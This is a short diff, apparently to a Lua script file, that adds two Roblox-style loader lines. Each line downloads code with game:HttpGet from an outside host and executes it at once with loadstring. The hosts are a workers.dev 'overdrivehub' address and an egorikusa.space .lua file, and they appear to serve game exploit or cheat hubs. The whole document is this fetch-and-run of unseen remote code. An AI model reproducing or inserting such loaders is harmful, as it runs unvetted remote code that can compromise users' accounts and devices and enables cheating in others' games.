@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://overdrivehub.odh.workers.dev/?d=auth&script=mm2_lite"))()
+loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
